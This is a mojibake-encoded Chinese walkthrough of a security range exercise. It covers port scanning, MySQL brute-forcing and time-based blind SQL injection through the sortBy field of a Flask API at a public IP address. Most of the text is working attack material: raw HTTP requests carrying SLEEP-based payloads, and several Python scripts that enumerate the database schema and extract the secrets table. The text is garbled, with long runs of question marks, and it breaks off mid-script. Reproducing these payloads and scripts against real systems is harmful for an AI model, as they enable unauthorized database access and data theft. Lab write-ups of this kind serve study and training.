# å°–ç«¯ç§‘æŠ€é¶åœº http://113.45.189.144:5000/#)

##### é¦–å…ˆçœ‹ä¸€ä¸‹å¤§è‡´æƒ…å†µ

![image-20250903191850422](images/image-20250903191850422.png)

#### æ²¡å•¥æœ‰ç”¨çš„

```
nmap -p- --min-rate 10000 113.45.189.144    å…ˆå…¨ç«¯å£æ‰«æä¸€ä¸‹
nmap -p 2000,3306,3389,5000,49664,49693 -sV -sC

PORT      STATE SERVICE       VERSION
2000/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5000/tcp  open  http          Werkzeug httpd 3.1.3 (Python 3.12.0)
49664/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  msrpc         Microsoft Windows RPC
```

**3306/tcp â†’ MySQL (unauthorized)**
 è¯´æ˜ MySQL å­˜åœ¨ï¼Œä½†æœªå…è®¸åŒ¿åè®¿é—®ã€‚å¯èƒ½éœ€è¦ç”¨æˆ·/å¯†ç ï¼Œå€¼å¾—åç»­ç”¨ **å¼±å£ä»¤æµ‹è¯•**

**3389/tcp â†’ RDP (Windows Server 2016/2019 å†…æ ¸ 10.0.14393)**

- TLS è¯ä¹¦æ˜¾ç¤ºæœºå™¨å `hcss-ecs-19a2`ã€‚
- æš´éœ²çš„ RDP æœåŠ¡æ˜¯æ”»å‡»è€…çš„é«˜ä»·å€¼ç›®æ ‡ï¼Œéœ€è¦ç¡®è®¤æ˜¯å¦å¯¹å…¬ç½‘å¼€æ”¾ã€‚
- å»ºè®®æ£€æŸ¥æ˜¯å¦å¼€å¯äº† **ç½‘ç»œçº§åˆ«èº«ä»½éªŒè¯ (NLA)**ï¼Œä»¥åŠæ˜¯å¦æ‰“äº† **BlueKeep (CVE-2019-0708)** ç­‰è¡¥ä¸ã€‚

```
æ¢æµ‹è´¦æˆ·æ˜¯å¦å­˜åœ¨å¼±å£ä»¤
nmap --script mysql-brute -p3306 113.45.189.144   å¤±è´¥
å°è¯•ç›®å½•çˆ†ç ´ï¼š
gobuster dir -u http://113.45.189.144:5000 -w   /usr/share/wordlists/dirb/common.txt     å¤±è´¥

```

ç„¶åå°±æ˜¯5000ç«¯å£çš„webæœåŠ¡

å°è¯•äº†å¾ˆä¹…å¾ˆä¹…ï¼Œæ€»ç»“å°±æ˜¯ ***/api/public_search*** æœ‰å¾ˆä¸¥æ ¼çš„è¿‡æ»¤è§„åˆ™

```
queryè¾“å…¥å•¥éƒ½æ˜¯è¿”å›ç©ºï¼Œå•å¼•å·è¢«è¿‡æ»¤ï¼Œå»¶è¿Ÿæ³¨ä¹Ÿä¸è¡Œ
sortByä¸¥æ ¼çš„ä¸€æ‰¹ï¼Œåªæ¥å—nameå’Œprice,
orderåªèƒ½å‡åºé™åº
```

![image-20250903224316467](images/image-20250903224316467.png)



#### æ²¡åŠæ³•äº†å»æ‰’ä¸€ä¸‹å‰ç«¯jså’Œhtmlçš„æºç ï¼Œè®©cursorä»£ç å®¡è®¡

![image-20250903233309166](images/image-20250903233309166.png)

### å‘ç° **/api/developer_utils/sorted_query **å¯ä»¥æ¥å— **sortby** çš„ä¼ å‚

### èµç¾cursor

#### æ¥ä¸‹æ¥å°±æ˜¯æ•°æ®åº“é•¿åº¦æ‰‹å·¥ç›²æ³¨

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close
Content-Length: 91

{"query":"\u6fc0\u5149","sortBy":"name,IF(LENGTH(DATABASE())=9,SLEEP(20),1)","order":"asc"}
ç¡®å®šæ•°æ®åº“åç§°æ˜¯9ä½




POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close
Content-Length: 95

{"query":"%","sortBy":"name,IF(ASCII(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),1)","order":"asc"}

ç¬¬ä¸€ä¸ªå­—ç¬¦æ˜¯119ï¼Œä¹Ÿå°±æ˜¯w

è¿™é‡ŒæœåŠ¡å™¨ç‚¸äº†ï¼Œå¡äº†å¥½ä¹…

```

# ç°åœ¨æ˜¯00ç‚¹43åˆ†ï¼Œå¤œæ·±äººé™ï¼Œæ²¡äººçˆ†ç ´ï¼Œæˆ‘æ¥çˆ†ç ´ï¼Œå¼€å§‹å¿«è½¦é“æ¨¡å¼



![image-20250904004236479](images/image-20250904004236479.png)

![image-20250904004502359](images/image-20250904004502359.png)

ä»ç»“æœå¯ä»¥çœ‹å‡º1-9 çš„ç ä¸º

```
119 101 98 97 112 112 95 100 98    æ•°æ®åº“åç§°æ˜¯webapp_db
```

![image-20250904005244927](images/image-20250904005244927.png)



#### ç°åœ¨çœ‹ *webapp_db* æ•°æ®åº“æœ‰å‡ ä¸ªè¡¨

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close
Content-Length: 140

{"query":"%","sortBy":"name,IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema='webapp_db')=3,SLEEP(5),1)","order":"asc"}
```

#### ç¡®å®šè¡¨æœ‰ä¸‰ä¸ª

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close
Content-Length: 160

{"query":"%","sortBy":"name,IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='webapp_db' LIMIT 0,1))=1,SLEEP(5),1)","order":"asc"}
```

ç›´æ¥çˆ†ç ´ï¼Œå¾—çŸ¥ç¬¬ä¸€ä¸ªè¡¨é•¿åº¦æ˜¯8

![image-20250904005931417](images/image-20250904005931417.png)

çˆ†ç ´ç¬¬ä¸€ä¸ªè¡¨çš„åå­—

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close

{"query":"%","sortBy":"name,IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='webapp_db' LIMIT 0,1),1,1))=48,SLEEP(5),1)","order":"asc"}
```

![image-20250904010628096](images/image-20250904010628096.png)

çˆ†å‡ºç»“æœ

![image-20250904010844068](images/image-20250904010844068.png)

```
112 114 111 100 117 99 116 115   ç¬¬ä¸€ä¸ªè¡¨çš„åå­—æ˜¯   products
```

### çˆ†ç ´ç¬¬äºŒä¸ªè¡¨çš„é•¿åº¦

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close

{"query":"%","sortBy":"name,IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='webapp_db' LIMIT 1,1))=1,SLEEP(5),1)","order":"asc"}
```

![image-20250904011237989](images/image-20250904011237989.png)

é•¿åº¦æ˜¯7ï¼Œç»§ç»­çˆ†ç ´åå­—

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close

{"query":"%","sortBy":"name,IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='webapp_db' LIMIT 1,1),1,1))=109,SLEEP(5),1)","order":"asc"}
```

#### ä¾æ—§é›†ç¾¤ç‚¸å¼¹

![image-20250904011443415](images/image-20250904011443415.png)

ä¾æ—§ç­›é€‰è¶…é«˜å»¶è¿Ÿ

![image-20250904011647225](images/image-20250904011647225.png)

```
115 101 99 114 101 116 115   ç¬¬äºŒä¸ªè¡¨æ˜¯->secrets  å‘ç°äº†ä½ çš„å°ç§˜å¯† å˜¿å˜¿ğŸ¤­ 01ç‚¹18åˆ†
```



ç…§è‘«èŠ¦ç”»ç“¢ç¬¬ä¸‰ä¸ªè¡¨

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close

{"query":"%","sortBy":"name,IF(LENGTH((SELECT table_name FROM information_schema.tables WHERE table_schema='webapp_db' LIMIT 2,1))=5,SLEEP(5),1)","order":"asc"}
```

![image-20250904012051358](images/image-20250904012051358.png)

### é•¿åº¦æ˜¯27ï¼Œè¿™å°¼ç›å¤ªé•¿äº†

æœ€åçˆ†åå­—

```
POST /api/developer_utils/sorted_query HTTP/1.1
Host: 113.45.189.144:5000
User-Agent: Burp
Accept: application/json
Content-Type: application/json
Origin: http://113.45.189.144:5000
Referer: http://113.45.189.144:5000/
Connection: close

{"query":"%","sortBy":"name,IF(ASCII(SUBSTRING((SELECT table_name FROM information_schema.tables WHERE table_schema='webapp_db' LIMIT 2,1),1,1))=109,SLEEP(5),1)","order":"asc"}
```

![image-20250904013010333](images/image-20250904013010333.png)



![image-20250904012944316](images/image-20250904012944316.png)

![image-20250904013345533](images/image-20250904013345533.png)

```
å¾—çŸ¥æœ€åè¡¨çš„åå­—ä¸ºï¼šzhu laoshi tianrongxinkebiao          01ç‚¹34åˆ† æ„Ÿè°¢chatgpt
```

### ç°åœ¨æˆ‘ä»¬å·²ç»è·å–äº†å®Œæ•´çš„æ•°æ®åº“ç»“æ„ï¼š

- æ•°æ®åº“ï¼š`webapp_db`
- è¡¨1ï¼š`products`ï¼ˆå•†å“è¡¨ï¼‰
- è¡¨2ï¼š`secrets`ï¼ˆæ•æ„Ÿä¿¡æ¯è¡¨ï¼‰
- è¡¨3ï¼š`zhu_laoshi_tianrongxinkebiao`ï¼ˆå¯èƒ½æ˜¯ç”¨æˆ·è¡¨ï¼‰

#### åç»­å°±æ˜¯çˆ†è¡¨é‡Œé¢çš„ä¸œè¥¿

### å®åœ¨ä¸æƒ³å†™äº†ï¼Œç›´æ¥ç”Ÿæˆè„šæœ¬è‡ªåŠ¨è·‘



### è„šæœ¬1ï¼šæŸ¥çœ‹secretsè¡¨ç»“æ„

```
import requests
import time

def test_sqli(payload):
    url = "http://113.45.189.144:5000/api/developer_utils/sorted_query"
    data = {
        "query": "%",
        "sortBy": f"name,IF({payload},SLEEP(5),1)",
        "order": "asc"
    }
    start = time.time()
    try:
        r = requests.post(url, json=data)
        elapsed = time.time() - start
        return elapsed > 4.5  # å»¶è¿Ÿåˆ¤æ–­
    except:
        return False

def get_column_count():
    """è·å–secretsè¡¨çš„åˆ—æ•°"""
    print("æ­£åœ¨æšä¸¾secretsè¡¨çš„åˆ—æ•°...")
    for count in range(1, 11):  # å‡è®¾æœ€å¤š10åˆ—
        payload = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='secrets')={count}"
        if test_sqli(payload):
            print(f"secretsè¡¨æœ‰ {count} åˆ—")
            return count
    return 0

def get_column_name(column_index):
    """è·å–æŒ‡å®šç´¢å¼•çš„åˆ—å"""
    print(f"æ­£åœ¨æšä¸¾ç¬¬{column_index+1}åˆ—çš„åç§°...")
    
    # å…ˆè·å–åˆ—åé•¿åº¦
    length = 0
    for len_val in range(1, 51):  # å‡è®¾åˆ—åæœ€é•¿50å­—ç¬¦
        payload = f"LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='secrets' LIMIT {column_index},1))={len_val}"
        if test_sqli(payload):
            length = len_val
            print(f"ç¬¬{column_index+1}åˆ—åé•¿åº¦ä¸º: {length}")
            break
    
    if length == 0:
        return ""
    
    # é€å­—ç¬¦æšä¸¾åˆ—å
    column_name = ""
    for pos in range(1, length + 1):
        for ascii_val in range(32, 127):  # å¯æ‰“å°å­—ç¬¦
            payload = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='secrets' LIMIT {column_index},1),{pos},1))={ascii_val}"
            if test_sqli(payload):
                column_name += chr(ascii_val)
                print(f"ç¬¬{column_index+1}åˆ—ç¬¬{pos}ä¸ªå­—ç¬¦: {chr(ascii_val)}")
                break
        else:
            print(f"ç¬¬{column_index+1}åˆ—ç¬¬{pos}ä¸ªå­—ç¬¦æšä¸¾å¤±è´¥")
            break
    
    return column_name

def main():
    print("å¼€å§‹è‡ªåŠ¨åŒ–æšä¸¾secretsè¡¨ç»“æ„...")
    
    # è·å–åˆ—æ•°
    column_count = get_column_count()
    if column_count == 0:
        print("æ— æ³•è·å–åˆ—æ•°")
        return
    
    # æšä¸¾æ¯åˆ—çš„åç§°
    columns = []
    for i in range(column_count):
        column_name = get_column_name(i)
        columns.append(column_name)
        print(f"ç¬¬{i+1}åˆ—: {column_name}")
    
    print(f"\nsecretsè¡¨ç»“æ„:")
    for i, col in enumerate(columns):
        print(f"  {i+1}. {col}")

if __name__ == "__main__":
    main()
```

![image-20250904023511241](images/image-20250904023511241.png)

```
secretsè¡¨ç»“æ„:
  1. id
  2. secret_key
  3. description
```



### è„šæœ¬2ï¼šæŸ¥çœ‹ products è¡¨ç»“æ„

```
import requests
import time

def test_sqli(payload):
    url = "http://113.45.189.144:5000/api/developer_utils/sorted_query"
    data = {
        "query": "%",
        "sortBy": f"name,IF({payload},SLEEP(5),1)",
        "order": "asc"
    }
    start = time.time()
    try:
        r = requests.post(url, json=data)
        elapsed = time.time() - start
        return elapsed > 4.5
    except:
        return False

def get_column_count(table_name):
    """è·å–æŒ‡å®šè¡¨çš„åˆ—æ•°"""
    print(f"æ­£åœ¨æšä¸¾{table_name}è¡¨çš„åˆ—æ•°...")
    for count in range(1, 11):
        payload = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='{table_name}')={count}"
        if test_sqli(payload):
            print(f"{table_name}è¡¨æœ‰ {count} åˆ—")
            return count
    return 0

def get_column_name(table_name, column_index):
    """è·å–æŒ‡å®šè¡¨çš„æŒ‡å®šç´¢å¼•çš„åˆ—å"""
    print(f"æ­£åœ¨æšä¸¾{table_name}è¡¨ç¬¬{column_index+1}åˆ—çš„åç§°...")
    
    # å…ˆè·å–åˆ—åé•¿åº¦
    length = 0
    for len_val in range(1, 51):
        payload = f"LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='{table_name}' LIMIT {column_index},1))={len_val}"
        if test_sqli(payload):
            length = len_val
            print(f"ç¬¬{column_index+1}åˆ—åé•¿åº¦ä¸º: {length}")
            break
    
    if length == 0:
        return ""
    
    # é€å­—ç¬¦æšä¸¾åˆ—å
    column_name = ""
    for pos in range(1, length + 1):
        for ascii_val in range(32, 127):
            payload = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='{table_name}' LIMIT {column_index},1),{pos},1))={ascii_val}"
            if test_sqli(payload):
                column_name += chr(ascii_val)
                print(f"ç¬¬{column_index+1}åˆ—ç¬¬{pos}ä¸ªå­—ç¬¦: {chr(ascii_val)}")
                break
        else:
            print(f"ç¬¬{column_index+1}åˆ—ç¬¬{pos}ä¸ªå­—ç¬¦æšä¸¾å¤±è´¥")
            break
    
    return column_name

def main():
    table_name = "products"
    print(f"å¼€å§‹è‡ªåŠ¨åŒ–æšä¸¾{table_name}è¡¨ç»“æ„...")
    
    # è·å–åˆ—æ•°
    column_count = get_column_count(table_name)
    if column_count == 0:
        print("æ— æ³•è·å–åˆ—æ•°")
        return
    
    # æšä¸¾æ¯åˆ—çš„åç§°
    columns = []
    for i in range(column_count):
        column_name = get_column_name(table_name, i)
        columns.append(column_name)
        print(f"ç¬¬{i+1}åˆ—: {column_name}")
    
    print(f"\n{table_name}è¡¨ç»“æ„:")
    for i, col in enumerate(columns):
        print(f"  {i+1}. {col}")

if __name__ == "__main__":
    main()
```

### ç°åœ¨æ˜¯03ç‚¹01åˆ†ï¼Œç¡è§‰ï¼Œæš‚æ—¶å°±çˆ†ç ´åˆ°è¿™é‡Œ

07ç‚¹35åˆ†é†’äº†ï¼Œæ¥æŸ¥çœ‹è·‘ä¸€æ™šä¸Šçš„æˆæœ

![image-20250904074138752](images/image-20250904074138752.png)

äº§å“è¡¨é‡Œé¢æ²¡æœ‰é‡è¦çš„ä¸œè¥¿ï¼Œæ˜¯å‰ç«¯è¦æ˜¾ç¤ºçš„äº§å“åç§°

ç¬¦åˆidï¼Œåç§°ï¼Œæè¿°ï¼Œä»·æ ¼

![image-20250904074311475](images/image-20250904074311475.png)

### è„šæœ¬3ï¼šæŸ¥çœ‹ zhu_laoshi_tianrongxinkebiao è¡¨ç»“æ„

```
import requests
import time

def test_sqli(payload):
    url = "http://113.45.189.144:5000/api/developer_utils/sorted_query"
    data = {
        "query": "%",
        "sortBy": f"name,IF({payload},SLEEP(5),1)",
        "order": "asc"
    }
    start = time.time()
    try:
        r = requests.post(url, json=data)
        elapsed = time.time() - start
        return elapsed > 4.5
    except:
        return False

def get_column_count(table_name):
    """è·å–æŒ‡å®šè¡¨çš„åˆ—æ•°"""
    print(f"æ­£åœ¨æšä¸¾{table_name}è¡¨çš„åˆ—æ•°...")
    for count in range(1, 11):
        payload = f"(SELECT COUNT(*) FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='{table_name}')={count}"
        if test_sqli(payload):
            print(f"{table_name}è¡¨æœ‰ {count} åˆ—")
            return count
    return 0

def get_column_name(table_name, column_index):
    """è·å–æŒ‡å®šè¡¨çš„æŒ‡å®šç´¢å¼•çš„åˆ—å"""
    print(f"æ­£åœ¨æšä¸¾{table_name}è¡¨ç¬¬{column_index+1}åˆ—çš„åç§°...")
    
    # å…ˆè·å–åˆ—åé•¿åº¦
    length = 0
    for len_val in range(1, 51):
        payload = f"LENGTH((SELECT column_name FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='{table_name}' LIMIT {column_index},1))={len_val}"
        if test_sqli(payload):
            length = len_val
            print(f"ç¬¬{column_index+1}åˆ—åé•¿åº¦ä¸º: {length}")
            break
    
    if length == 0:
        return ""
    
    # é€å­—ç¬¦æšä¸¾åˆ—å
    column_name = ""
    for pos in range(1, length + 1):
        for ascii_val in range(32, 127):
            payload = f"ASCII(SUBSTRING((SELECT column_name FROM information_schema.columns WHERE table_schema='webapp_db' AND table_name='{table_name}' LIMIT {column_index},1),{pos},1))={ascii_val}"
            if test_sqli(payload):
                column_name += chr(ascii_val)
                print(f"ç¬¬{column_index+1}åˆ—ç¬¬{pos}ä¸ªå­—ç¬¦: {chr(ascii_val)}")
                break
        else:
            print(f"ç¬¬{column_index+1}åˆ—ç¬¬{pos}ä¸ªå­—ç¬¦æšä¸¾å¤±è´¥")
            break
    
    return column_name

def main():
    table_name = "zhu_laoshi_tianrongxinkebiao"
    print(f"å¼€å§‹è‡ªåŠ¨åŒ–æšä¸¾{table_name}è¡¨ç»“æ„...")
    
    # è·å–åˆ—æ•°
    column_count = get_column_count(table_name)
    if column_count == 0:
        print("æ— æ³•è·å–åˆ—æ•°")
        return
    
    # æšä¸¾æ¯åˆ—çš„åç§°
    columns = []
    for i in range(column_count):
        column_name = get_column_name(table_name, i)
        columns.append(column_name)
        print(f"ç¬¬{i+1}åˆ—: {column_name}")
    
    print(f"\n{table_name}è¡¨ç»“æ„:")
    for i, col in enumerate(columns):
        print(f"  {i+1}. {col}")

if __name__ == "__main__":
    main()
```

![image-20250904074553158](images/image-20250904074553158.png)

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ





### è„šæœ¬4  æŸ¥çœ‹ secrets è¡¨çš„å†…å®¹

```
import requests
import time

def test_sqli(payload):
    url = "http://113.45.189.144:5000/api/developer_utils/sorted_query"
    data = {
        "query": "%",
        "sortBy": f"name,IF({payload},SLEEP(5),1)",
        "order": "asc"
    }
    start = time.time()
    try:
        r = requests.post(url, json=data)
        elapsed = time.time() - start
        return elapsed > 4.5
    except:
        return False

def get_row_count():
    """è·å–secretsè¡¨çš„è¡Œæ•°"""
    print("æ­£åœ¨æšä¸¾secretsè¡¨çš„è¡Œæ•°...")
    for count in range(0, 11):  # å‡è®¾æœ€å¤š10è¡Œ
        payload = f"(SELECT COUNT(*) FROM secrets)={count}"
        if test_sqli(payload):
            print(f"secretsè¡¨æœ‰ {count} è¡Œæ•°æ®")
            return count
    return 0

def get_field_value(row_index, column_name, field_index):
    """è·å–æŒ‡å®šè¡ŒæŒ‡å®šåˆ—çš„å€¼"""
    print(f"æ­£åœ¨æšä¸¾ç¬¬{row_index+1}è¡Œ{column_name}å­—æ®µçš„å€¼...")
    
    # å…ˆè·å–å­—æ®µå€¼é•¿åº¦
    length = 0
    for len_val in range(0, 201):  # å‡è®¾å­—æ®µå€¼æœ€é•¿200å­—ç¬¦
        payload = f"LENGTH((SELECT {column_name} FROM secrets LIMIT {row_index},1))={len_val}"
        if test_sqli(payload):
            length = len_val
            print(f"ç¬¬{row_index+1}è¡Œ{column_name}å­—æ®µé•¿åº¦ä¸º: {length}")
            break
    
    if length == 0:
        return ""
    
    # é€å­—ç¬¦æšä¸¾å­—æ®µå€¼
    field_value = ""
    for pos in range(1, length + 1):
        for ascii_val in range(32, 127):  # å¯æ‰“å°å­—ç¬¦
            payload = f"ASCII(SUBSTRING((SELECT {column_name} FROM secrets LIMIT {row_index},1),{pos},1))={ascii_val}"
            if test_sqli(payload):
                field_value += chr(ascii_val)
                print(f"ç¬¬{row_index+1}è¡Œ{column_name}ç¬¬{pos}ä¸ªå­—ç¬¦: {chr(ascii_val)}")
                break
        else:
